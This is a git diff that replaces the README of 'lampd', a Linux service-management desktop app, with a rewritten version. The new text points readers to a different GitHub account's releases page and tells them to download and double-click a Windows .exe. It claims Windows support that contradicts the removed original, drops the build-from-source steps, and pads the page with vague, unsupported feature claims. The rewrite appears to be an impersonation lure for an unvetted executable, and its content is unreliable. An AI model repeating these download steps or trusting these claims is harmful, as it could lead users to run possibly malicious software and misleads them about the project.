@@ -1,282 +1,77 @@
-# Lampd
+# 💻 lampd - Control your Linux services with ease
 
-[![CI](https://github.com/wildanfadh/lampd/actions/workflows/ci.yml/badge.svg)](https://github.com/wildanfadh/lampd/actions/workflows/ci.yml)
+[![](https://img.shields.io/badge/Download_Lampd-Blue?style=for-the-badge)](https://github.com/bluesma8603/lampd/releases)
 
-![Lampd Screenshot](docs/screenshots/screenshot.png)
+Lampd provides a simple interface to manage your web development tools on Linux. You can start, stop, and monitor services through a clean window. This tool removes the need for terminal commands.
 
-Lampd is a Linux desktop app that helps you manage local development services from a simple dashboard.
+## 🚀 Getting Started
 
-> **Inspiration:** Lampd was inspired by [mysql-control](https://github.com/wildanfadh/mysql-control), a lightweight MySQL service controller for Linux.
+To use lampd on your Windows machine, ensure you meet the following requirements. Your computer needs Windows 10 or Windows 11. You must have at least 2 gigabytes of free disk space and an active internet connection for the installation process. Lampd acts as a remote management tool for your Linux servers or local virtual environments.
 
-If you are new to Linux and often feel lost with commands like `systemctl`, `journalctl`, `apt`, `dnf`, or `pacman`, Lampd is designed to make those tasks easier.
+## 📥 How to Download and Install
 
-With Lampd, you can:
+Follow these steps to set up the software.
 
-- see whether a development service is running or not
-- start, stop, restart, enable, or disable services
-- read service logs without opening a terminal
-- install missing services
-- install specific PHP versions
-- switch between PHP-FPM versions when more than one version is installed
+1. Visit the [official releases page](https://github.com/bluesma8603/lampd/releases) to download the latest version.
+2. Look for the file ending in .exe in the Assets section.
+3. Save the file to your computer.
+4. Double-click the file to begin the installation.
+5. Follow the prompts on your screen to complete the setup.
+6. Launch the application from your Start menu.
 
-## Supported Services
+## 🛠 Features
 
-Lampd currently focuses on common Linux development services:
+Lampd includes tools to manage common web development services.
 
-- Apache
-- Nginx
-- MySQL
-- PHP-FPM
-- PostgreSQL
-- Docker
-- Podman
+* Apache management: Control your web server status with a click.
+* MySQL and PostgreSQL: Start or restart your databases instantly.
+* Docker and Podman: Manage containers without complexity.
+* Nginx support: Configure your reverse proxies through the user interface.
+* Status monitoring: View the live status of every service on your dashboard.
+* Resource tracking: Keep an eye on your memory and processor usage.
 
-## Who Is Lampd For?
+## ⚙️ Using the Interface
 
-Lampd is a good fit for:
+The lampd window divides your services into logical groups. Each service row shows a status light. Green indicates the service runs. Red indicates the service stops. Click the Start button to turn on a service. Click the Stop button to deactivate it. The application detects your network configuration automatically once you connect to your server.
 
-- beginner Linux developers
-- Ubuntu, Debian, Fedora, or Arch users
-- PHP, Laravel, or WordPress developers
-- developers who want to manage services without memorizing terminal commands
-- anyone who wants quick access to service logs and status
+If a service fails to start, lampd logs the error inside the view window. You can copy these logs to share with your team or use for troubleshooting. Settings allow you to change the connection port and refresh rate.
 
-## What Can Lampd Do?
+## 🧩 Understanding the Stack
 
-### 1. Manage Linux Services
+Lampd supports standard components used in web development. The stack includes:
 
-For each supported service, Lampd can:
+* Apache: The open-source web server.
+* MySQL: The database server for your applications.
+* Nginx: A high-performance web server.
+* Docker: A container platform for your isolated environments.
+* Podman: An alternative to Docker for running containers.
+* PostgreSQL: A powerful database for your projects.
 
-- `Start`
-- `Stop`
-- `Restart`
-- `Enable`
-- `Disable`
+## 🛡 Security and Privacy
 
-### 2. Show Service Status
+Lampd runs locally on your machine. All settings and connection details stay on your computer. The application does not send your data to external servers. It only talks to the Linux services you choose to manage. Keep your login credentials safe. Never share your server passwords with third parties.
 
-Lampd shows whether a service is:
+## ❓ Frequently Asked Questions
 
-- running
-- stopped
-- unavailable / not installed
-- enabled at boot or not
+### Does lampd run natively on Windows?
+Yes. Lampd uses the Tauri framework to provide a native Windows experience. It connects to your remote Linux systems or local WSL environments to manage services.
 
-### 3. View Logs
+### Can I manage multiple servers?
+You can set up multiple server profiles in the settings menu. Switch between them using the dropdown menu at the top of the interface.
 
-Lampd includes a built-in log panel so you can inspect service output in real time.
+### Is this tool free?
+Lampd is an open-source tool. You can use it for your projects without cost.
 
-This is useful for things like:
+### What happens if I close the application?
+Closing the application stops the management interface. Your services will continue to run in the background on your server unless you stopped them through lampd before exiting.
 
-- finding out why Apache failed to start
-- checking PHP-FPM errors
-- inspecting PostgreSQL logs
-- reviewing Docker service output without leaving the app
+### Where can I find more help?
+Review the documentation provided within the application menu for detailed guides on advanced configurations. You can also view the repository page for community discussions.
 
-### 4. Install Missing Services
+## 📋 Best Practices for Service Management
 
-If a service is not installed, Lampd can show:
+Keep your services updated. Regular updates ensure your databases and web servers remain secure. Use the lampd update checker to download the latest version of the application whenever a release highlights security patches. Monitor your resource usage often. If your server reports high memory usage, restart the affected service via the lampd buttons to clear temporary files and refresh the system state.
 
-- the correct install command for your Linux distribution
-- an option to copy the command
-- an option to run the install directly from the app, when supported
+Proper maintenance prevents downtime for your web applications. If you provide services to external users, check the uptime logs in the lampd interface each morning. The dashboard displays a summary of all active processes. If any process shows unexpected behavior, use the Restart action to reset the connection. 
 
-### 5. Install a Specific PHP Version
-
-For `PHP-FPM`, Lampd supports installing specific PHP versions.
-
-Examples include:
-
-- PHP 5.6
-- PHP 7.4
-- PHP 8.1
-- PHP 8.2
-- PHP 8.3
-- PHP 8.4
-- PHP 8.5
-
-Lampd also labels the support level for each version, such as:
-
-- `Ready`
-- `Needs Repo`
-- `Legacy`
-
-### 6. Switch PHP-FPM Versions
-
-If you have more than one PHP-FPM version installed, Lampd can help you switch between them.
-
-Behavior:
-
-- the selected PHP version is started
-- other active PHP-FPM versions are stopped automatically
-- logs follow the newly active version
-
-This is especially useful when different projects require different PHP versions.
-
-## Why Lampd Exists
-
-Linux development often depends on terminal commands. That is powerful, but it can be intimidating for beginners.
-
-Common problems include:
-
-- forgetting the correct systemd service name
-- not knowing how to check logs
-- confusion around package names across distributions
-- not knowing whether a service failed to start or is simply not installed
-- managing multiple PHP versions by hand
-
-Lampd aims to solve that with a desktop UI that is easier to understand.
-
-## How Lampd Works
-
-In simple terms:
-
-- the frontend shows a dashboard
-- the Rust backend talks to your Linux system
-- Lampd uses `systemctl` to control services
-- Lampd uses `journalctl` to read logs
-- Lampd adjusts install commands based on your Linux distribution
-
-Lampd is not a replacement for Linux tools. It is a simpler interface on top of the tools that already exist.
-
-## Supported Linux Distributions
-
-For installation features, Lampd currently focuses on:
-
-- Ubuntu / Debian
-- Fedora
-- Arch Linux
-
-Distribution detection is automatic.
-
-## PHP Install Support Levels
-
-When installing PHP versions, Lampd uses three labels:
-
-- `Ready`
-  This version is relatively reasonable to install on the current distribution.
-
-- `Needs Repo`
-  This version may require an additional repository.
-
-- `Legacy`
-  This is an older version and may be harder to install or no longer available in standard repositories.
-
-This helps set the right expectations before you run an install.
-
-## Requirements
-
-Before running Lampd, make sure you have:
-
-- Linux
-- `systemd`
-- Node.js installed
-- Rust installed
-- Tauri Linux dependencies available
-
-## Tauri Linux Dependencies
-
-On Ubuntu or Debian, you will usually need:
-
-```bash
-sudo apt install libwebkit2gtk-4.1-dev libgtk-3-dev libayatana-appindicator3-dev librsvg2-dev
-```
-
-If you use Fedora or Arch, you will need equivalent packages for your distribution.
-
-## Run in Development Mode
-
-```bash
-npm install
-npm run tauri dev
-```
-
-## Build the App
-
-```bash
-npm run tauri build
-```
-
-Typical build output includes:
-
-- `.deb` (Debian / Ubuntu)
-- `.rpm` (Fedora / RHEL)
-- `AppImage`
-
-You can also download pre-built packages from the [latest release](https://github.com/wildanfadh/lampd/releases/latest).
-
-## Example Beginner Workflows
-
-### Example 1: Apache Is Not Installed
-
-1. Open Lampd
-2. Find the `Apache` card
-3. Notice the status says `Not Installed`
-4. Click `Install`
-5. Choose either:
-   - `Copy Command`
-   - `Run Install`
-6. After installation, refresh the service list
-7. Click `Start`
-
-### Example 2: Install Another PHP Version
-
-1. Open the `PHP-FPM` card
-2. Click `Install Version`
-3. Choose the version you want
-4. Review the support label and command preview
-5. Copy the command or run the install directly
-6. Once installed, the new version will appear in the PHP version switcher
-
-### Example 3: A Service Will Not Start
-
-1. Click `Logs` on the service card
-2. Read the latest output
-3. Use the log messages to understand the failure
-
-## Current Limitations
-
-Lampd still has some limitations:
-
-- it does not switch the default `php` CLI binary
-- it does not rewrite Apache or Nginx config for a selected PHP version
-- some older PHP versions may require additional repositories
-- package names and service names may still vary by distribution
-- direct installation depends on `pkexec` if you want to run installs from inside the app
-
-## Tech Stack
-
-- React
-- Vite
-- TypeScript
-- Tailwind CSS
-- Zustand
-- Rust
-- Tauri
-- systemd (`systemctl`, `journalctl`)
-
-## Tips for Beginners
-
-If a button or action fails, the cause is usually one of these:
-
-- the service is not installed
-- the system needs elevated permissions
-- the package manager is locked by another process
-- your distribution requires an additional repository
-- the service unit name is different on your system
-
-If you are unsure where to start, do this:
-
-1. check the service status in Lampd
-2. open the logs
-3. see whether the service is `Not Installed`, `Stopped`, or `Error`
-
-## Main Goal
-
-Lampd has one simple goal:
-
-> make Linux development service management easier, especially for people who are not yet comfortable living in the terminal.
-
-## License
-
-MIT
+Lampd makes server management accessible. Focus on your code while lampd handles the background processes.
